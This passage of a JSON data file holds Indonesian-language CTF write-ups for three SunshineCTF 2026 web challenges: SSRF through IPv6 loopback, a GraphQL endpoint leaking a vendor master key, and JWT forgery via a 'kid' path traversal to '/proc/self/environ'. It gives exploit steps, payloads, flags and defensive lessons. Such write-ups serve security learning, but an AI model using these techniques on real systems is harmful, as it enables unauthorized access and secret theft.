        "content": "SSRF melalui perbedaan validasi hostname/IP. Validator menolak alamat lokal IPv4 biasa, tetapi menerima IPv6 loopback dalam bracket notation. Browser drone memiliki session admin bawaan."
      },
      {
        "title": "Eksploitasi",
        "content": "Drone diarahkan ke:\n\n```text\nhttp://[::1]:3000/profile#clearance\n```\n\nAnchor `#clearance` membuat viewport screenshot langsung menampilkan bagian clearance milik admin drone. Screenshot hasil scan dapat diambil dari `/screenshots/<id>.png` menggunakan session akun pemicu."
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py\n```\n\nScript mendaftar akun, memicu SSRF, mengunduh screenshot, menjalankan OCR lokal, dan mencetak flag yang benar-benar muncul pada screenshot aplikasi."
      },
      {
        "title": "Flag",
        "content": "`sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}`"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit bergantung pada service internal di `[::1]:3000`, session admin milik browser drone, dan `tesseract` yang tersedia di environment. Screenshot disimpan sebagai `flag-screenshot.png` saat script berjalan."
      },
      {
        "title": "Evidence",
        "content": "![SSRF report showing the internal service response](/assets/writeups/sunshinectf/sitecheck/service.png)\n\n![Admin drone clearance section reached through the internal profile page](/assets/writeups/sunshinectf/sitecheck/clearance.png)\n\n![Final screenshot containing the flag](/assets/writeups/sunshinectf/sitecheck/flag-screenshot.png)"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}",
    "lessonsLearned": "Normalisasi alamat IP harus dilakukan sebelum validasi dan mencakup semua representasi loopback, private range, DNS rebinding, redirect, serta IPv4-mapped IPv6. Service internal sebaiknya tetap memerlukan autentikasi dan network isolation."
  },
  {
    "id": "sunshinectf-web-used-goods-of-tomorrow",
    "title": "Used Goods of Tomorrow",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "API GraphQL marketplace membocorkan vendor master key melalui endpoint diagnostik. Key tersebut membuka promo internal, termasuk promo 100% untuk listing Founders’ Vault, sehingga order gratis mengembalikan flag.",
    "problemDescription": "Daftar sebagai user biasa, eksploitasi diagnostic endpoint untuk memperoleh vendor key, cari promo yang berlaku pada listing target, lalu kirim mutation `placeOrder`.",
    "tools": [
      "curl",
      "GraphQL introspection/querying",
      "Python 3",
      "JSON parsing"
    ],
    "analysis": "Flow exploit terdiri dari registrasi user, pengambilan vendor key melalui response diagnostik, enumerasi promo yang mencocokkan listing `4042`, dan mutation order dengan promo tersebut. Response order mengonfirmasi harga nol dan mengisi field flag.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Flag diambil lewat GraphQL. Endpoint diagnostik vendor bisa dipanggil oleh user biasa dan membocorkan master key. Key tersebut membuka daftar promo internal, termasuk promo 100% untuk deed Founders' Vault."
      },
      {
        "title": "Target dan File",
        "content": "- Target: `https://usedgoods.web.2026.sunshinectf.games`\n- Endpoint utama: `/graphql`\n- Reproducer: [`solve.py`](./solve.py)"
      },
      {
        "title": "Analisis Awal",
        "content": "HTML storefront dan `static/app.js` menunjukkan bahwa aplikasi menggunakan token Bearer dari `localStorage` dan semua operasi akun/order dikirim ke GraphQL. Akun baru mendapat 500 credits, sedangkan listing `4042` berharga 1.000.000 credits.\n\nSchema introspection GraphQL memperlihatkan mutation tambahan:\n\n```graphql\nvendorTerminalSync(terminalId: ID): VendorDiagnostics\n```\n\nQuery `promoCodes(vendorKey: String!)` juga terlihat pada root query."
      },
      {
        "title": "Vulnerability",
        "content": "`vendorTerminalSync` hanya membutuhkan autentikasi user biasa, tetapi mengembalikan `vendorKey` master. Tidak ada pemeriksaan bahwa pemanggil benar-benar terminal vendor. Key yang dikembalikan dapat dipakai untuk membaca promo internal."
      },
      {
        "title": "Eksploitasi",
        "content": "1. Register akun baru dan gunakan token hasil register.\n2. Panggil:\n\n```graphql\nmutation {\n  vendorTerminalSync {\n    vendorKey terminalId status firmware note\n  }\n}\n```\n\nResponse membocorkan key:\n\n```text\nVND-MASTER-21d5f80206dffb6fa9ad5722\n```\n\n3. Kirim key itu ke:\n\n```graphql\nquery ($key: String!) {\n  promoCodes(vendorKey: $key) {\n    code description percentOff appliesTo\n  }\n}\n```\n\nDaftar promo memuat `FOUNDERS-100`, dengan `percentOff: 100` dan `appliesTo: \"4042\"`.\n\n4. Place order untuk listing `4042` menggunakan promo tersebut:\n\n```graphql\nmutation ($id: ID!, $promo: String) {\n  placeOrder(listingId: $id, promoCode: $promo) {\n    success message listingId pricePaid flag\n  }\n}\n```\n\nResponse menyatakan order sukses dengan harga 0 dan mengisi field `flag`."
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py\n```\n\nScript membuat username unik, memperoleh vendor key, mencari promo yang berlaku untuk `4042`, lalu mengekstrak flag dari response `placeOrder`. Target dapat diganti dengan argumen pertama atau environment variable `TARGET`."
      },
      {
        "title": "Flag",
        "content": "`sun{1_l0v3_fr33_stuff}`"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit tidak bergantung pada ID terminal: argumen `terminalId` nullable dan response default tetap membocorkan key. Script memilih promo berdasarkan kode dan listing, sehingga tidak bergantung pada urutan daftar promo."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{1_l0v3_fr33_stuff}",
    "lessonsLearned": "Endpoint diagnostik tidak boleh tersedia bagi user biasa dan secret vendor tidak boleh dikirim ke client. Terapkan authorization per resolver, validasi promo di server, dan jangan mempercayai field harga dari input user."
  },
  {
    "id": "sunshinectf-web-you-are-kidding-me",
    "title": "You Are Kidding Me",
    "category": "Web",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Endpoint `/admin` memuat JWT verification key berdasarkan header `kid`. Debug inspector membocorkan isi `/proc/self/environ` saat signature gagal, sehingga secret dapat dipakai untuk memalsukan token admin.",
    "problemDescription": "Dapatkan key melalui debug disclosure, buat JWT dengan header `kid` yang sesuai dan role admin, lalu akses endpoint `/admin` untuk mengambil flag.",
    "tools": [
      "curl",
      "Python 3",
      "JWT analysis",
      "Base64URL encoding",
      "HTTP debugging"
    ],
    "analysis": "Verifier memisahkan pemilihan key dari validasi signature dan debug path mengembalikan environment process. Setelah secret ditemukan, token HS256 dengan claim admin dan `kid` yang tepat diterima oleh endpoint `/admin`.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Endpoint `/admin` memverifikasi JWT berdasarkan file yang namanya diambil dari header `kid`. Endpoint itu juga memiliki debug inspector yang membocorkan isi key ketika signature gagal."
      },
      {
        "title": "Target dan File",
        "content": "Target: `https://kidding.web.2026.sunshinectf.games/`\n\nDirektori challenge kosong, jadi analisis dilakukan terhadap service remote yang diberikan. Solver ada di [solve.py](./solve.py)."
      },
      {
        "title": "Analisis Awal",
        "content": "`POST /login` menerbitkan JWT dengan payload seperti:\n\n```json\n{\"sub\":\"reader\",\"role\":\"reader\"}\n```\n\nHeader token memakai `HS256` dan `kid: reader.key`. Mengirim nama `editor` lewat login tidak menaikkan role; role tetap `reader`."
      },
      {
        "title": "Black-box Analysis",
        "content": "Source code tidak tersedia; bagian ini merangkum behavior yang diamati dari service. Dari behavior response terlihat bahwa aplikasi memuat key dari pola `/app/keys/<kid>`, lalu menampilkan key yang dipakai jika verifikasi gagal. Key internal tertentu memang disembunyikan, tetapi file arbitrer tetap bisa diminta melalui traversal."
      },
      {
        "title": "Vulnerability",
        "content": "Ada arbitrary file read melalui JWT `kid`, ditambah debug disclosure. Nilai berikut dinormalisasi menjadi `/proc/self/environ`:\n\n```text\n../../../../proc/self/environ\n```\n\nJWT probe dengan `role=editor` dan signature sengaja salah menghasilkan `401`, tetapi response mengandung raw bytes `/proc/self/environ` di elemen `<pre id=\"disclosed\">`."
      },
      {
        "title": "Eksploitasi",
        "content": "1. Buat JWT HS256 dengan `kid=../../../../proc/self/environ` dan key sembarang yang tidak kosong.\n2. Kirim token itu ke `GET /admin`.\n3. Ambil isi `/proc/self/environ` dari debug disclosure.\n4. Gunakan bytes tersebut sebagai HMAC key untuk membuat JWT baru dengan payload `{\"role\":\"editor\"}`.\n5. Kirim JWT forged ke `/admin`.\n\nRequest forged berhasil dengan HTTP 200 dan halaman editor menampilkan flag."
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py\n```\n\nTarget dapat diganti dengan environment variable:\n\n```bash\nTARGET=\"https://kidding.web.2026.sunshinectf.games\" python3 solve.py\n```"
      },
      {
        "title": "Flag",
        "content": "Flag diambil langsung dari halaman `/admin` setelah token forged diterima:\n\n```text\nsun{h0tw1r3d_4dm1n_jwt}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Solver bergantung pada debug disclosure yang mengembalikan bytes `/proc/self/environ` persis seperti yang dipakai verifier. Script memvalidasi status HTTP dan pola flag sebelum mencetak hasil."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{h0tw1r3d_4dm1n_jwt}",
    "lessonsLearned": "Jangan membaca key berdasarkan path atau header yang dikendalikan user, jangan membocorkan secret melalui error response, dan validasi algoritma, issuer, audience, expiry, serta authorization claim secara ketat."
  }
];
